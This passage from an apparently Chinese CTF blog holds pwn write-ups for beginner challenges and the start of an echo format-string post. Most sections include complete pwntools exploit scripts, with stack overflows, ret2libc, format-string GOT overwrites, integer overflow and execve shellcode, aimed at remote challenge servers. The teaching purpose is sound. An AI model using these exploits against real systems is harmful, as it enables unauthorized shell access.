remote(<span class="string">'111.198.29.45'</span>,<span class="number">34452</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x80</span>+<span class="number">8</span>) + p64(<span class="number">0x0000000000400596</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x06-level2"><a href="#0x06-level2" class="headerlink" title="0x06 level2"></a>0x06 level2</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809150446.png" alt></p><ul><li>典型的栈溢出。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809150527.png" alt></p><ul><li><p>存在<code>/bin/sh</code>但是没有调用。</p></li><li><p>存在<code>system函数</code>但是是用来<code>echo</code>一些信息的。</p></li><li><p>所以直接把<code>system函数</code>的参数修改成<code>/bin/sh</code>就好了。</p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">55974</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line"></span><br><span class="line">sys_add = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">binsh_add = elf.search(<span class="string">'/bin/sh'</span>).next()<span class="comment">#也可以直接用上图中找到的0x0804A024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(sys_add) + p32(<span class="number">0x0</span>) + p32(binsh_add)</span><br><span class="line"><span class="comment">#为什么payload是这个顺序请看下文。</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Input:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><ul><li>为什么payload是上面那个顺序？</li><li>答:</li></ul><blockquote><p>在32位程序运行中，函数参数直接压入栈中<br>调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1</p></blockquote><blockquote><p>而在64位程序运行中，参数传递需要寄存器<br>64位参数传递约定：前六个参数按顺序存储在寄存器rdi, rsi, rdx, rcx, r8, r9中<br>参数超过六个时，从第七个开始压入栈中</p></blockquote><h1 id="0x07-guess-num"><a href="#0x07-guess-num" class="headerlink" title="0x07 guess_num"></a>0x07 guess_num</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809162816.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809164259.png" alt></p><ul><li>var_30就是 v8, seed就是seed, 可以进行覆盖,间隔为0x20个字节。</li></ul><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ul><li><p>覆盖seed为1, 模拟执行srand(1),然后在exp中模拟得到v7的各值进行输入。</p></li><li><p>但是需要知道该程序的libc。</p></li><li><p>可以通过如下方法得到libc版本。</p></li></ul><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><ul><li>利用pwntools的ELF模块。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809164648.png" alt></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><ul><li><code>ldd</code>命令。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809164749.png" alt></p><ul><li>思路一的exp如下:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">59620</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Your name:'</span>)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span>) + p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    c.recvuntil(<span class="string">'Please input your guess number:'</span>)</span><br><span class="line">    c.sendline(str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ul><li>覆盖seed, 然后直接求出10次 <code>rand()%6+1</code>,得到如下输出。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809181917.png" alt></p><ul><li>exp如下:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">54730</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Your name:'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span>)+p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">L = [<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L:</span><br><span class="line">    c.recvuntil(<span class="string">'Please input your guess number:'</span>)</span><br><span class="line">    c.sendline(str(i))</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x08-cgpwn2"><a href="#0x08-cgpwn2" class="headerlink" title="0x08 cgpwn2"></a>0x08 cgpwn2</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190812173520.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190812173530.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190812173559.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190812173611.png" alt></p><ul><li>观察字符串发现并没有<code>/bin/sh</code>,但是有对bss段的name的操作,可以通过将<code>/bin/sh</code>写入name,然后构造payload。</li></ul><blockquote><p>在32位程序调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1</p></blockquote><ul><li><p>所以随便找一个返回地址<code>0x0804854D</code></p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">45942</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./cgpwn2'</span>)</span><br><span class="line"></span><br><span class="line">system = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="string">'/bin/sh'</span></span><br><span class="line"></span><br><span class="line">bin_add = <span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">back = <span class="number">0x0804854D</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'please tell me your name'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(bin_sh)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'hello,you can leave some message here:'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x26</span>+<span class="number">4</span>) + p32(system) + p32(back) + p32(bin_add)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x09-string"><a href="#0x09-string" class="headerlink" title="0x09 string"></a>0x09 string</h1><ul><li>题目宛如玩RPG游戏。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813170059.png" alt></p><ul><li>先是给了你俩secret 让你去打龙, <code>secret[0]</code>就是v3的首地址,后面会用到。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813170107.png" alt></p><ul><li>然后让你输入角色名字来创建角色。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813170134.png" alt></p><ul><li>问你往哪走, 很明显根据逻辑需要走<code>east</code></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813170151.png" alt></p><ul><li>让你给它个地址,然后输入你的愿望,这里有明显的格式化字符串漏洞<code>printf(&amp;format, &amp;format);</code></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813170202.png" alt></p><ul><li><p>最后如果<code>*a1 == a1[1]</code> 即 最开始的<code>v3[0]</code> = 85,巫师就会帮助你,你就可以自己创造一个<code>v1函数</code>来执行了,这个函数肯定要创造成能拿到shell的函数。</p></li><li><p>目标地址直接传给了v2, v2和format相连。</p></li><li><p><code>_isoc99_scanf(&quot;%s&quot;,&amp;format);</code>到<code>format</code>的偏移为8,但是目标地址是存入v2了,所以实际偏移应该为8-1=7</p></li><li><p>shellcode就是通用的shellcode了,具体看下面链接。</p></li></ul><p><a href="https://blog.csdn.net/p0x1307/article/details/46930371" target="_blank" rel="noopener">传送门</a></p><p><a href="https://www.baidu.com/link?url=DDjEkMfUGayueESdAP9QGL9vcJiTn1EEViZxS1-yW-orbaW7LnX3QkHj6dEI7vxnW1-JoB-1Dj-1uCofBHyztK&wd=&eqid=f4138c0c00148608000000025d52c1a9" target="_blank" rel="noopener">传送门</a></p><ul><li>exp如下:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">34306</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line"></span><br><span class="line">add = c.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">add = int(add,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'name be:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'LiuLian'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'east or up?:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'east'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'leave(0)?:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Give me an address'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(str(add))</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'you wish is:'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">85</span> + <span class="string">'%7$n'</span></span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'USE YOU SPELL\n'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x10-int-overflow"><a href="#0x10-int-overflow" class="headerlink" title="0x10 int_overflow"></a>0x10 int_overflow</h1><ul><li>考察整数溢出漏洞。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813164736.png" alt></p><ul><li>这是个模拟登陆系统。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813164751.png" alt></p><ul><li>俩<code>read函数</code>都没有溢出点,接着查看<code>check_passwd</code>函数。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813164845.png" alt></p><ul><li><p>发现了危险函数<code>strcpy</code>,<code>s(即passwd)</code>的空间明显大于<code>dest</code>的空间,可以通过这里进行溢出。</p></li><li><p>但是要进入这个<code>else</code>语句,需要 <code>v3(即passwd的长度)</code>大于3 小于等于8,但是很明显这个长度根本不够写<code>payload</code>,所以要在这里进行整形溢出。</p></li><li><p>查看汇编语言可以看到</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813165250.png" alt></p><ul><li><p><code>passwd</code>的长度是用<code>al</code>寄存器来传值的,而<code>al</code>寄存器是8位寄存器,传值的范围为<code>0~255</code>,超过这个范围就会造成溢出。</p></li><li><p>实际长度256的话,传值以后为0, 257-&gt;1, 258-&gt;2 …以此类推。</p></li><li><p>所以我们只需要让这个<code>s(即passwd)</code>的长度在260~264之间即可。</p></li><li><p>查找字符串能找到<code>cat flag</code> 来到对应位置,是一个后门函数。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813165711.png" alt></p><ul><li><p>后门函数的地址为<code>0x0804868B</code></p></li><li><p><code>dest</code>距离<code>ebp</code>的偏移为<code>0x14</code>,覆盖<code>ebp</code>需要4个字节,所以得到payload为:</p></li><li><p><code>payload = &#39;a&#39;*0x14 + &#39;a&#39;*4 + p32(0x0804868B) + &#39;a&#39;*(260-0x14-4-4)</code></p></li><li><p>payload不唯一, 最后那个地方,260~264都可以。</p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">52568</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x14</span> + <span class="string">'a'</span>*<span class="number">4</span> + p32(<span class="number">0x0804868B</span>) + <span class="string">'a'</span>*(<span class="number">260</span><span class="number">-0x14</span><span class="number">-4</span><span class="number">-4</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Please input your username:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'LiuLian'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Please input your passwd:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x11-level3"><a href="#0x11-level3" class="headerlink" title="0x11 level3"></a>0x11 level3</h1><ul><li><p>这题是<code>Jarvis OJ - [XMAN]</code>的原题,但是在攻防世界平台上面出了点bug,题目没给全(少了libc-2.19.so),而且远程怎么都跑不出来。</p></li><li><p>原题链接:</p></li></ul><p><a href="https://dn.jarvisoj.com/challengefiles/level3.rar.2047525b05c499c9dd189ba212bba1f8" target="_blank" rel="noopener">传送门</a></p><ul><li>以原题为例吧。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190814173615.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190814173626.png" alt></p><ul><li><p><code>read函数</code>位置存在明显的栈溢出,但是这个题和<code>level2</code>不同,<code>level2</code>程序中存在<code>system函数</code>和<code>/bin/sh</code>,只是<code>system函数</code>用来<code>echo</code>一些信息,<code>/bin/sh</code>没有被调用。</p></li><li><p>但是这道题目程序中没有<code>system函数</code>,也不存在<code>/bin/sh</code>。</p></li><li><p>由于题目给了libc文件,考虑ret2libc。</p></li><li><p>正常的溢出思路如下。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/1251324-20171126214819578-1152036283.png" alt></p><ul><li><p>但是由于不知道<code>sys_addr</code>和<code>bin addr</code>的值,我们要想办法知道这俩的值。</p></li><li><p>但是我们可以利用<code>函数在内存中的地址和libc文件中的偏移的差相等</code>,通过程序中的已有函数,比如<code>read</code>和<code>write</code>来获得这个偏移差。而且给了libc文件,我们就能知道<code>system函数</code>和<code>/bin/sh</code>在libc文件中的地址,从而通过<code>sys_addr - sys_libc == write_addr - write_libc == 偏移差offset</code>,得到<code>sys_addr</code>,同理可得<code>bin addr</code>。</p></li><li><p>曾试了好久能不能直接把<code>writegot</code>的值直接<code>print</code>出来,然而并没有成功,可能因为我太菜了,也可能是因为这个办法不可行。</p></li><li><p>有一些技术性的文章,对做这个题目挺有帮助的,强烈建议看一看第一篇。</p></li></ul><p><a href="https://www.jianshu.com/p/6626a866ad66" target="_blank" rel="noopener">传送门</a></p><p><a href="https://blog.csdn.net/zhangmiaoping23/article/details/82590259" target="_blank" rel="noopener">传送门</a></p><ul><li>这道题目用到了这么一个点。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190814211046.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190814211117.png" alt></p><ul><li>基本思路已经很清晰了。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190814211151.png" alt></p><blockquote><p>在32位程序运行中，函数参数直接压入栈中<br>调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1</p></blockquote><ul><li>所以我们要想办法构成这种形式,我们的调用函数即<code>write函数</code>,后面的参数都是传给这个<code>write函数</code>的,调用完毕以后返回到我们的<code>函数的返回地址</code>。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/1251324-20171126215553468-1721731322.png" alt></p><ul><li>从而exp如下:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process("./level3")</span></span><br><span class="line">io = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9879</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line"></span><br><span class="line">writeplt = elf.plt[<span class="string">"write"</span>]<span class="comment">#plt和got都在可执行程序中</span></span><br><span class="line">writegot = elf.got[<span class="string">"write"</span>]</span><br><span class="line">func = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"><span class="keyword">print</span> writegot</span><br><span class="line"><span class="keyword">print</span> u32(writegot)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line">writelibc = libc.symbols[<span class="string">"write"</span>]<span class="comment">#libc中可以找到程序中有的/没有的函数的偏移</span></span><br><span class="line">syslibc = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binlibc = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'a'</span>*<span class="number">4</span> + p32(writeplt) + p32(func) + p32(<span class="number">1</span>)+p32(writegot)+p32(<span class="number">4</span>)<span class="comment">#溢出地址+返回地址+参数</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">writeaddr = u32(io.recv(<span class="number">4</span>))<span class="comment">#由于python没有指针，不能*write_got，需要将其输出并保存</span></span><br><span class="line">sysaddr = writeaddr - writelibc + syslibc<span class="comment">#利用偏移量相等获得其真实地址</span></span><br><span class="line">binaddr = writeaddr - writelibc + binlibc</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'a'</span>*<span class="number">4</span> + p32(sysaddr) + p32(func) + p32(binaddr)</span><br><span class="line">io.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p><strong>后续补充</strong></p><p>后来在刷BUUCTF的时候写了一个能打通的EXP</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./level3')</span></span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26690</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x08048484</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Input:\n'</span>,timeout = <span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x88</span> + <span class="string">'bbbb'</span> + p32(elf.plt[<span class="string">'write'</span>]) + p32(main) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">'write'</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line">write_addr = u32(c.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">'write_addr = '</span> + hex(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Input:\n'</span>,timeout = <span class="number">0.5</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x88</span> + <span class="string">'bbbb'</span> + p32(system) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="新手练习区已完结"><a href="#新手练习区已完结" class="headerlink" title="新手练习区已完结"></a>新手练习区已完结</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/94.jpg" alt></p>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>[Hackme.inndy]echo/echo2/echo3</title>
    <url>/2020/03/16/Hackme-inndy-echo-echo2-echo3/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/72707136_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong>通过三道格式化字符串的题目学习巩固格式化字符串漏洞的利用</strong></p><p>这是[Hackme.inndy]的题目，在BUUOJ上也能找得到。</p><p>做这三道题目用了不少时间，仔细想想，还是因为最开始学格式化字符串的时候没学扎实，漏了挺多细节，导致题目打不通。</p><p>不过虽然用了不少时间，但是收获还是非常多的。</p><h1 id="0x01-echo"><a href="#0x01-echo" class="headerlink" title="0x01 echo"></a>0x01 echo</h1><p>这是三道题目里面最简单的一道。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/image-20200317004722413.png" alt></p><p>很明显存在格式化字符串漏洞。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>由于是32位程序，可以直接利用pwntools的<code>fmtstr_payload</code>模块构造payload，覆盖<code>printf_got</code>为<code>system_plt</code>，然后<code>sendline(&#39;/bin/sh&#39;)</code>即可</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./echo')</span></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29729</span>)</span><br><span class="line">elf = ELF(<span class="string">'./echo'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system = elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;printf:system&#125;)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x02-echo2"><a href="#0x02-echo2" class="headerlink" title="0x02 echo2"></a>0x02 echo2</h1><p>这道题相比第一道要有些难度了。</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>可以看到程序开启了PIE且是64位程序。</p><p>所以要先泄露程序真正的加载地址，然后再覆盖<code>printf_got</code>为<code>system_plt</code>。</p><p>不过这里不能再用pwntools的<code>fmtstr_payload</code>模块了,因为64位程序的地址容易出现’\x00’造成截断。</p><h2 id="Do-it！"><a href="#Do-it！" class="headerlink" title="Do it！"></a>Do it！</h2><h3 id="泄露程序加载地址"><a href="#泄露程序加载地址" class="headerlink" title="泄露程序加载地址"></a>泄露程序加载地址</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010304.png" alt></p><p>可以在IDA中看到<code>call printf</code>的地址为0x984，这是相对偏移，gdb下断在此处然后查看栈的情况如下:</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010441.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010524.png" alt></p><p>能够看到<code>0x7fffffffde48</code>存放着<code>main+74</code>，<code>0x7fffffffde58</code>存放着<code>__libc_start_main+240</code></p><p>调试可以知道这两处分别对应<code>%41$p</code>、<code>%43$p</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010913.png" alt></p><p>通过pie命令可以知道程序加载基址为<code>0x555555554000</code>，这和我们的main+74正好相差0xa03，由此可以泄露出程序加载基址。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'%41$p---'</span> + <span class="string">'%43$p...'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line">elfbase  = int(c.recvuntil(<span class="string">'---'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0xa03</span></span><br><span class="line">l_s_m_addr = int(c.recvuntil(<span class="string">'...'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line"><span class="comment">#libc = LibcSearcher('__libc_start_main',l_s_m_addr)</span></span><br><span class="line"><span class="comment">#libcbase = l_s_m_addr - libc.dump('__libc_start_main')</span></span><br><span class="line"></span><br><span class="line">system = elf.plt[<span class="string">'system'</span>] + elfbase</span><br><span class="line"><span class="comment">#system = libcbase + libc.dump('system')</span></span><br><span class="line">printf = elf.got[<span class="string">'printf'</span>] + elfbase</span><br><span class="line">success(<span class="string">'printf = '</span> + hex(printf))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br></pre></td></tr></table></figure><p><strong>实际上只需要泄露出elfbase即可，但是大多数wp都同时泄露了__libc_start_main进而泄露libcbase，然后通过libcbase+libc.dump(‘system’)来得到system地址</strong></p><p>根据注释应该能看出来这是两种方法，通过测试这两种方法都是可以打通的</p><h3 id="构造payload-amp-getshell"><a href="#构造payload-amp-getshell" 